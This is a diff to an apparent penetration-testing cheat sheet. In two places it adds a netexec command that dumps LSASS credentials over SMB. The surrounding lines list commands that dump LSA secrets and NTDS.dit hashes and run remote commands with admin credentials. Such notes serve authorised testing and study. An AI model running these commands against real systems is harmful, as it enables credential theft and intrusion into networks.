@@ -546,6 +546,9 @@ netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 
 # Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
 netexec smb <ip> -u <username> -p <password> --ntds
+
+# Uses netexec in conjunction with admin credentials to dump LSASS
+netexec  smb <ip> -u <username> -p <password> -M lsassy
 ```
 ##### Windows Local Password Attacks
 ```
@@ -3197,6 +3200,9 @@ netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 
 # Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
 netexec smb <ip> -u <username> -p <password> --ntds
+
+# Uses netexec in conjunction with admin credentials to dump LSASS
+netexec  smb <ip> -u <username> -p <password> -M lsassy
 
 # Execute a command over the SMB service using netexec.
 netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
